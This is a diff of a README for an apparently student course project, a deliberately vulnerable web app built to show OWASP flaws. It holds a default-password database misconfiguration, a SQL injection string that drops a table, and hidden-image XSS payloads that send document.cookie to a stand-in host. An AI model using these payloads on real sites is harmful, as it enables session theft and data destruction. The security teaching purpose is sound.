@@ -1,38 +1,28 @@
-### Cyber Security Base 2019 -project
+# Cyber Security Base 2019 -project
 
 This app is a project created for MOOC course Cyber Security Base 2019-2020.
 
 ## Project description
 In the first course project, your task is to create a web application that has at least five different flaws from the OWASP top ten list (https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf).
-Starter code for the project is provided on Github at https://github.com/cybersecuritybase/cybersecuritybase-project.
 
-
-/course/{id}
-=> listaa opiskelija ja arvosanat
-
-/course/{id}/grade/{studentid}
-
-
-/student/{id}
-=> listaa opiskelijan kurssit ja arvosanat
 
 ## Project essay
 
-LINK: <link to repo>
+LINK: https://github.com/nurvel/spring-owasp-vulnerable-app
 
 
-##FLAW 1: A6:2017-Security Misconfiguration
-#OWASP description of the security flaw:
+### FLAW 1: A6:2017-Security Misconfiguration
+#### OWASP description of the security flaw:
 Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure
 default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured
 HTTP headers, and verbose error messages containing sensitive information. Not only must all
 operating systems, frameworks, libraries, and applications be securely configured, but they must
 be patched and upgraded in a timely fashion.
 
-#How the security flaw behaves in the app
+#### How the security flaw behaves in the app
 H2 data base URL not secured and using default password
 
-#How to fix the security flaw in the app
+#### How to fix the security flaw in the app
 Change default password to H2
 
 
@@ -108,6 +98,9 @@ INSERT INTO signup (address, name) VALUES ('testijuttu', '
 Bye bye courses!') ; DROP TABLE course; --
 ')
 
+style=\"display: none;\"
+
+<script>document.write("<img src=\"http://www.haxor.com/cookiesteal/" + document.cookie +"\" style=\"display: none;\" />")  </script>
 
 # ALLA OLEVA TOIMII
 <script>document.write("<img src=\"http://www.haxor.com/cookisteal/" + document.cookie +"\"/>")  </script>
